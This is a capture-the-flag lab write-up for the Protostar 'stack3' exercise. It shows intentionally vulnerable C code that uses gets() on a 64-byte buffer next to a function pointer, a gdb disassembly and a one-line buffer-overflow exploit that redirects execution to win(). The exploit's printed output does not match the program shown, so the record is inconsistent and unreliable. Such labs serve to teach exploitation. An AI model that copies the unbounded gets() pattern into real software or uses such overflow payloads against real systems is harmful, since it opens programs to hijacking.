---
title: "stack3"
date: "2023-05-16"
site: https://exploit.education/protostar/
---

`/opt/protostar/bin/stack3`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Disassembly

```bash
user@protostar:/opt/protostar/bin$ gdb -batch -ex 'file stack3' -ex 'disassemble win'
Dump of assembler code for function win:
0x08048424 <win+0>:     push   %ebp
0x08048425 <win+1>:     mov    %esp,%ebp
0x08048427 <win+3>:     sub    $0x18,%esp
0x0804842a <win+6>:     movl   $0x8048540,(%esp)
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret
End of assembler dump.
```

## Analysis

We need to overwrite fp to be `0x08048424`.

## Exploit

```bash
user@protostar:/opt/protostar/bin$ echo $(python -c 'print "A"*64 + "\x24\x84\x04\x08"') | ./stack3
you have correctly got the variable to the right value
```
